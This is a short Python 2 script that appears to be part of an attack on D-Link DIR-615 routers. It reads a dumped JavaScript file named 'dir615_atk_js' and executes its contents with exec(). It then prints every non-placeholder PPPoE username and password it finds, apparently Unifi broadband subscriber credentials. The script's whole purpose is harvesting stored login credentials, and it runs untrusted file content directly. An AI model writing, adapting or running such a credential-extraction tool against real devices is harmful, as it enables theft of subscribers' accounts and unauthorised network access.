#!/usr/bin/python

with open ("dir615_atk_js", "r") as infile:
    data=infile.read().replace('\n', '').replace('\t', '')

unifi_pppoe_raw = data.strip("var ")

unifi_pppoe_list = []

exec(unifi_pppoe_raw)

for unifi_pppoe in WPPOE_list:
	if (unifi_pppoe[3] != 'user') and (unifi_pppoe[3] != 'username@hsbb'):
		print "[Account Found]"
		print "Username: " + unifi_pppoe[3]
		print "Password: " + unifi_pppoe[4]
	